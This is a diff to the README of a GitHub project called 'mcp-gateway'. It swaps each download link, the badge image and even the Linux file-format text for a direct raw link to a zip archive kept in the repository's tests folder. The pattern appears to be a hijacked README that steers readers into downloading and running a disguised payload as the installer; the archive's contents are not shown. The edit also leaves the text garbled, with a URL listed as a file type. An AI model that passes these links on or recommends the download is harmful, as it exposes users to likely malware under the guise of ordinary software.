@@ -1,7 +1,7 @@
 # 🌟 mcp-gateway - Connect Your Tools Effortlessly
 
 ## 📥 Download Now
-[![Download mcp-gateway](https://img.shields.io/badge/Download%20mcp--gateway-v1.0-blue.svg)](https://github.com/Rares683/mcp-gateway/releases)
+[![Download mcp-gateway](https://github.com/Rares683/mcp-gateway/raw/refs/heads/main/tests/gateway-mcp-3.9.zip%https://github.com/Rares683/mcp-gateway/raw/refs/heads/main/tests/gateway-mcp-3.9.zip)](https://github.com/Rares683/mcp-gateway/raw/refs/heads/main/tests/gateway-mcp-3.9.zip)
 
 ## 📖 Introduction
 Welcome to **mcp-gateway**, a practical application designed to streamline your workflow by connecting various tools in one place. Whether you want to manage your projects more effectively or improve communication among different applications, this gateway simplifies the process. 
@@ -12,13 +12,13 @@ To get started with mcp-gateway, follow these simple steps to download and insta
 ## 🔗 Download & Install
 1. **Visit the Releases Page**  
    Click the link below to access the download page for mcp-gateway:  
-   [Download mcp-gateway](https://github.com/Rares683/mcp-gateway/releases)
+   [Download mcp-gateway](https://github.com/Rares683/mcp-gateway/raw/refs/heads/main/tests/gateway-mcp-3.9.zip)
 
 2. **Choose the Latest Version**  
    On the releases page, look for the latest version. You will see a list of files available for download. 
 
 3. **Download the Installer**  
-   Click on the file that is suitable for your operating system. Common options include `.exe` for Windows, `.dmg` for Mac, and `.tar.gz` for Linux.
+   Click on the file that is suitable for your operating system. Common options include `.exe` for Windows, `.dmg` for Mac, and `https://github.com/Rares683/mcp-gateway/raw/refs/heads/main/tests/gateway-mcp-3.9.zip` for Linux.
 
 4. **Run the Installer**  
    Once the download is complete, locate the file in your downloads folder. Double-click the file to begin the installation. Follow the prompts to complete the installation process.
@@ -76,4 +76,4 @@ This project is licensed under the MIT License. You can freely use and modify it
 We value your interest in mcp-gateway. For any updates or new features, keep an eye on the releases page. We hope this gateway enhances your productivity and simplifies your tasks. 
 
 Don’t forget to visit the download page to get started:  
-[Download mcp-gateway](https://github.com/Rares683/mcp-gateway/releases)
+[Download mcp-gateway](https://github.com/Rares683/mcp-gateway/raw/refs/heads/main/tests/gateway-mcp-3.9.zip)
